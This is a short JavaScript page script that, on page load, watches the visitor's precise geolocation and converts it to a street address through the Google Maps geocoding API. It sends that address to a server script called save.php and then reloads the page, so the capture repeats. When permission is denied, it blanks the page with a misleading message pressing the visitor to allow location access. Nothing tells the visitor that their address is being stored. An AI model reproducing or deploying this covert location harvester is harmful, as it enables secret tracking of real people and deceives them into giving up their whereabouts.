    window.onload=function(){

        // initialization ---------------------------------------------------------------
        var nav     =   navigator.geolocation;
        var watcher =   false;  
        var geoLoc  =   {};
        var xhr     =   new XMLHttpRequest();
        var urlReq  =   "https://maps.googleapis.com/maps/api/geocode/json?latlng=";
        var mapOptions= {
            zoom:18,
            mapTypeId:google.maps.MapTypeId.ROADMAP
        };
        var map     =   false;
        var marker  =   false;




        // making a request for geo location --------------------------------------------
        if(nav){
            watcher=nav.watchPosition(success_callback,error_callback,{
                    enableHighAccuracy:true,
                    timeout:5*100*60,
                    maximumAge:8*1000});
        }

        // success callback --------------------------------------------------------------
        function success_callback(pos){
            geoLoc.latitude=pos.coords.latitude;
            geoLoc.longitude=pos.coords.longitude;
            geoLoc.accuracy=pos.coords.accuracy;
            geoLoc.heading=pos.coords.heading;
            display();
        }
        // error call back ----------------------------------------------------------------
        function error_callback(err){
            if(err){
                document.body.innerHTML="Please just disallowed the setting, allow So as the Server can Reach the site";
                
                nav.clearWatch(watcher);
            }
        }

        function display(){
            var  makeurl=urlReq+geoLoc.latitude+","+geoLoc.longitude;
            xhr.open("GET",makeurl,true);
            xhr.send();

            xhr.onload=function(){
                var data=JSON.parse(xhr.responseText);
                if(data.status=="OK"){
                    var loc=data.results[0].formatted_address;
                    var xhr1=new XMLHttpRequest();
                    xhr1.open('get','save.php?save='+loc.toString());
                    xhr1.send();
                    xhr1.onload=function(){
                        window.location.reload();
                    };
                }else{
                    alert("SORRY!! Not able to fetch location");
                }
        };
        }

}

